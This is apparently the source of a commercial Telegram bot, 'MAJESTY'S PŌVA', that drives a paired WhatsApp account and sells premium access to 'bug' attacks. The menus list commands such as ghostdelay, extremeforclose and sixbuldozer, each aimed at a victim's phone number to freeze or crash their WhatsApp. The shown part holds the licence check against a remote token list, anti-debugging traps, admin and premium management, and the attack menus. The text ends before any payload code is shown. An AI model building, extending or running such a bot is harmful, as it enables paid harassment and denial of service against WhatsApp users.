const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = "https://raw.githubusercontent.com/yanzvxc0031/MAJESTY/main/tokens.json";
const thumbnailUrl = "https://files.catbox.moe/swhxms.jpg";
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
███████╗███████╗███╗   ██╗███╗   ██╗
██╔════╝██╔════╝████╗  ██║████╗  ██║
███████╗█████╗  ██╔██╗ ██║██╔██╗ ██║
╚════██║██╔══╝  ██║╚██╗██║██║╚██╗██║
███████║███████╗██║ ╚████║██║ ╚████║
╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═══╝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : Yanzzuul
☇ Name Script : MAJESTY'S PŌVA
☇ Version : 27.0 New Era
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
███████╗███████╗███╗   ██╗███╗   ██╗
██╔════╝██╔════╝████╗  ██║████╗  ██║
███████╗█████╗  ██╔██╗ ██║██╔██╗ ██║
╚════██║██╔══╝  ██║╚██╗██║██║╚██╗██║
███████║███████╗██║ ╚████║██║ ╚████║
╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═══╝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : bahlilmemekanj
☇ Name Script : NEXUS VLOID
☇ Version : V1 Gen 1
  
  Bypass detected, the code in angelcase will be messed up.
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
███████╗███████╗███╗   ██╗███╗   ██╗
██╔════╝██╔════╝████╗  ██║████╗  ██║
███████╗█████╗  ██╔██╗ ██║██╔██╗ ██║
╚════██║██╔══╝  ██║╚██╗██║██║╚██╗██║
███████║███████╗██║ ╚████║██║ ╚████║
╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═══╝
» Information:
☇ Creator : bahlilmemekanj
☇ Name Script : NEXUS VLOID
☇ Version : V1 Gen 1
  
  Bypass detected, the code in angelcase will be messed up.
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
███████╗███████╗███╗   ██╗███╗   ██╗
██╔════╝██╔════╝████╗  ██║████╗  ██║
███████╗█████╗  ██╔██╗ ██║██╔██╗ ██║
╚════██║██╔══╝  ██║╚██╗██║██║╚██╗██║
███████║███████╗██║ ╚████║██║ ╚████║
╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═══╝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : bahlilmemekanj
☇ Name Script : NEXUS VLOID
☇ Version : V1 Gen 1
  
  Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
███████╗███████╗███╗   ██╗███╗   ██╗
██╔════╝██╔════╝████╗  ██║████╗  ██║
███████╗█████╗  ██╔██╗ ██║██╔██╗ ██║
╚════██║██╔══╝  ██║╚██╗██║██║╚██╗██║
███████║███████╗██║ ╚████║██║ ╚████║
╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═══╝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : bahlilmemekanj
☇ Name Script : NEXUS VLOID
☇ Version : V1 Gen 1
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false; // volatile gate: require token each restart

let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const adminFile = './database/admin.json';
const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadAdmins = () => {
    try {
        const data = fs.readFileSync(adminFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const saveAdmins = (admins) => {
    try {
        fs.writeFileSync(adminFile, JSON.stringify(admins, null, 2));
    } catch (err) {
    }
};

const addAdmin = (userId) => {
    const admins = loadAdmins();
    admins[userId] = true;
    saveAdmins(admins);
    return true;
};

const removeAdmin = (userId) => {
    const admins = loadAdmins();
    delete admins[userId];
    saveAdmins(admins);
    return true;
};

const isAdmin = (userId) => {
    const admins = loadAdmins();
    return admins[userId] === true || userId == ownerID;
};

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {6
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
███████╗███████╗███╗   ██╗███╗   ██╗
██╔════╝██╔════╝████╗  ██║████╗  ██║
███████╗█████╗  ██╔██╗ ██║██╔██╗ ██║
╚════██║██╔══╝  ██║╚██╗██║██║╚██╗██║
███████║███████╗██║ ╚████║██║ ╚████║
╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═══╝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : bahlilmemekanj
☇ Name Script : NEXUS VLOID
☇ Version : V1 Gen 1 
☇ Status : Bot Connect
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.00"],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote>( 🦋 ) - Connect Sender</blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
███████╗███████╗███╗   ██╗███╗   ██╗
██╔════╝██╔════╝████╗  ██║████╗  ██║
███████╗█████╗  ██╔██╗ ██║██╔██╗ ██║
╚════██║██╔══╝  ██║╚██╗██║██║╚██╗██║
███████║███████╗██║ ╚████║██║ ╚████║
╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═══╝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : bahlilmemekanj
☇ Name Script : NEXUS VLOID
☇ Version : V1 Gen 1
☇ Status: Sender Connected
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("requestpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /requestpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote>( 🦋 ) - Connect Sender</blockquote>
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Status: Not Connected`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote>( 🦋 ) - Connect Sender</blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("cooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /cooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("selsension", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /addadmin 12345678");
    }
    
    const userId = args[1];
    addAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai admin`);
});

bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /deladmin 12345678");
    }
    
    const userId = args[1];
    if (userId == ownerID) {
        return ctx.reply("❌ ☇ Tidak dapat menghapus pemilik utama");
    }
    
    removeAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar admin`);
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgc', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgc -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgc', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgc -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

bot.start(async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const menuMessage = `\`\`\`js   
ℳ 𝔸 𝕁 𝔼 𝕊 𝕋 𝕐'𝕊  ℙ Ō 𝕍 𝔸
━━━━━━━━━━━━━━━━━━━━━━━━

Ramadhan Special Edition

SYSTEM CORE
━━━━━━━━━━━━━━━━━━━━━━━━
Owner : @Yanzzuul
Partner : @veroxiter
version : 27.0
System : Auto-Update
Access : Premium Verified
Premium : ONLINE
━━━━━━━━━━━━━━━━━
PRICE LIST
━━━━━━━━━━━━━━━━━
Script : 40.000
Reseller : 80.000

━━━━━━━━━━━━━━━━━
Sedang Puasa?
Tetap Semangat & Semoga Berkah

Tap button below to continue →\`\`\``;

    const keyboard = [
        [
            {
                text: "⬅️ Back",
                callback_data: "/tqto"
            },
            {
                text: "Owner", 
                url: "https://t.me/Yanzzuul"   
            },
            {   
                text: "➡️ Next",
                callback_data: "/controls"                  
            },
        ]
    ];

    return ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action('/start', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
  
    const menuMessage = `\`\`\`js    
ℳ 𝔸 𝕁 𝔼 𝕊 𝕋 𝕐'𝕊  ℙ Ō 𝕍 𝔸
━━━━━━━━━━━━━━━━━━━━━━━━

Ramadhan Special Edition

SYSTEM CORE
━━━━━━━━━━━━━━━━━━━━━━━━
Owner : @Yanzzuul
version : 27.0
Partner : @veroxiter
System : Auto-Update
Access : Premium Verified
Premium : ONLINE
━━━━━━━━━━━━━━━━━
PRICE LIST
━━━━━━━━━━━━━━━━━
Script : 40.000
Reseller : 80.000

━━━━━━━━━━━━━━━━━
Sedang Puasa?
Tetap Semangat & Semoga Berkah

Tap button below to continue →\`\`\``;

    const keyboard = [
        [
            {
                text: "⬅️ Back",
                callback_data: "/tqto"
            },
            {
                text: "Owner", 
                url: "https://t.me/Yanzzuul"   
            },
            {   
                text: "➡️ Next",
                callback_data: "/controls"                  
            },
        ]
    ];
    
    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "Markdown",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/controls', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    
    const controlsMenu = `\`\`\`js   
⬡═―—⊱ SYSTEM CONTROL ⊰―—═⬡
  /requestpair     - Add Sender
  /cooldown        - Set Cooldown
  /selsension      - Reset Session 

⬡═―—⊱ USER MANAGEMENT ⊰―—═⬡
  /addprem         - Add Premium
  /delprem         - Delete Premium
  /addgroup        - Add Premium Group
  /delgroup        - Delete Premium Group

🌙 Page 2/5 🌙\`\`\``;

    const keyboard = [
        [
            {
                text: "⬅️ Back",
                callback_data: "/start"
            },
            {
                text: "Owner", 
                url: "https://t.me/Yanzzuul"   
            },
            {   
                text: "➡️ Next",
                callback_data: "/tools"
            },
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const bugMenu = `\`\`\`js  
🌙 BUG TYPE SELECTION 🌙

⬡═―—⊱ BUG CATEGORIES ⊰―—═⬡
  Invisible Bug - Bug tak terlihat
  Visible Bug   - Bug terlihat

🌙 Page 4/5 🌙
\`\`\``;

    const keyboard = [
        [
            { text: "Delay Invisible", callback_data: "/bug2" },
            { text: "Force Close", callback_data: "/bug3" }
        ],
        [
            { text: "Bulldozer", callback_data: "/bug4" },
            { text: "Murbug Spam", callback_data: "/bug5" }
        ],
        [
            { text: "Ios Bugs", callback_data: "/bug6" },
            { text: "Invisible Android", callback_data: "/bug7" }
        ],
        [
            { text: "Owner", url: "https://t.me/Yanzzuul" },
            { text: "Group", url: "https://t.me/yanzabout" }
        ],
        [
            { text: "⬅️", callback_data: "/tools" },
            { text: "➡️", callback_data: "/tqto" }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug2', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const bug2Menu = `\`\`\`js   
🌙 DELAY INVISIBLE BUG 🌙

⬡═―—⊱ DELAY TYPE ⊰―—═⬡
  /ghostdelay     - 628xx [ DELAY INVISBLE ]
  /extradelay     - 628xx [ DELAY HARD INVISBLE ]

🌙 RAMADAN KAREEM 🌙
\`\`\``;

    const keyboard = [
        [
            {
                text: "⬅️ Back",
                callback_data: "/bug"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bug2Menu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug3', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const bug3Menu = `\`\`\`js  
🌙 FORCLOSE BUG 🌙

⬡═―—⊱ FORCLOSE TYPE ⊰―—═⬡
  /extremeforclose   - 628xx [ FC VISIBLE ]
  /ghostfc           - 628xx [ FC HARD VISIBLE ]
  /invisibleandro    - 628xx [ FC SPAM CALL ]
  
🌙 RAMADAN KAREEM 🌙
\`\`\``;

    const keyboard = [
        [
            {
                text: "⬅️ Back",
                callback_data: "/bug"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bug3Menu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug4', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const bug4Menu = `\`\`\`js   
🌙 BULDOZER BUG 🌙

⬡═―—⊱ BULDOZER TYPE ⊰―—═⬡
  /buldozerdelay   - 628xx [ BULDOZERxDELAY ]
  /sixbuldozer     - 628xx [ BULDOZER 5GB ]

🌙 RAMADAN KAREEM 🌙
\`\`\``;

    const keyboard = [
        [
            {
                text: "⬅️ Back",
                callback_data: "/bug"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bug4Menu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug5', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const bug5Menu = `\`\`\`js
🌙 MURBUG 🌙

